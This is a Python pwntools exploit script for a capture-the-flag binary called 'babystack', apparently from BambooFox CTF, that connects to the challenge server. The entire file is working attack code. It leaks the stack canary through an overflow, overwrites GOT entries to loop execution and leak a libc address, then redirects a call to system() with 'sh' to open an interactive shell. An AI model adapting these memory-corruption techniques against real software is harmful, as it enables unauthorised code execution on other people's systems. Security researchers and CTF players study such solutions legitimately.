from pwn import *

elf = ELF("./babystack")
libc = ELF("./libc6_2.29-0ubuntu2_amd64.so")
LOCAL = 0

def conn():
    if LOCAL:
        return process([elf.path])
    else:
        return remote('chall.ctf.bamboofox.tw', 10102)

def sa(s, d):
	target.sendafter(s, d)

def s(d):
	target.send(d)

target = conn()
sa("Name: ", "0")
sa("token: \n", "deadbeef")
sa("str1: ", "A"*9)
target.recvuntil("A"*9)
canary = u64("\x00" + target.recv(7))
log.info("Stack Canary: " + hex(canary))
sa("str2: ", "B")

def overwrite_v(addr, data):
	sa("str1: ", "\x00".ljust(0x10, "A"))
	sa("str2: ", "B"*0x28 + p64(canary) + p64(addr + 0x50))
	s(data)
	
overwrite_v(elf.got['puts'], p64(elf.plt['puts'] + 6) + p64(elf.plt['strlen'] + 6) + p64(0x004013fd))		#Create endless loop
target.recvline()
target.recvline()
libc_base = u64(target.recvline().strip().ljust(8, "\x00")) - libc.sym['puts']
log.info("LIBC Base: " + hex(libc_base))

def overwrite(addr, data):
	s("\x00".ljust(0x10, "A"))
	s("B"*0x28 + p64(canary) + p64(addr + 0x50))
	s(data)
#Use the address from do_system() manually, so stack alignemnt problem can be avoided.
overwrite(elf.got['puts'] - 8, "sh 1>&0\x00" + p64(libc_base + 0x52B02))#p64(libc_base + libc.sym['system']))

target.interactive()
